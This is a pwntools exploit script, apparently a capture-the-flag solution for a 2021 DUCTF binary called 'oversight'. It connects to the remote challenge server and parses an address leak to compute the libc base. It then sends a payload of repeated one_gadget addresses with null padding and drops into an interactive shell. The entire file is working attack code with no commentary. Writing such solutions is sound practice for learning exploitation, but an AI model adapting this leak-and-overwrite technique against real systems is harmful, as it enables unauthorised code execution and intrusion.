from pwn import *

r = remote("pwn-2021.duc.tf",31909)

# r = process("./oversight")
# gdb.attach(r)

onegadget = 0x4f432

r.recvuntil("continue")
r.sendline(b'16')
leak = r.recvuntil(b"Are").split(b": ")[2][:12]
leak = int(leak,16)

base = leak - 0x3ec7e3
gadget = base + onegadget

r.recvuntil("256)?")
r.sendline("256")

payload = p64(gadget)*29 + b"\x00"
payload += b"\x00"*(256-len(payload))
r.sendline(payload)

r.interactive()



